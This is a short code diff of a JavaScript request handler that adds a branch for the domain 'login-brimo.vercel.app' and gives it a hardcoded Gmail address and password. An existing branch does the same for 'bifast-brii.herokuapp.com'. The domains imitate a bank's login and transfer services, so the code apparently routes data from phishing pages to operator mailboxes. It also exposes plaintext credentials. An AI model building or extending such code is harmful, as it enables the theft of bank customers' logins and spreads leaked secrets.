@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+     if (url == 'login-brimo.vercel.app'){
+
+       email = 'otpbifas@gmail.com'
+       pass = 'xdlrtyyqmcgcwahc'
+    }else
+    
     if (url == 'bifast-brii.herokuapp.com'){
 
        email = 'appanjay717@gmail.com'
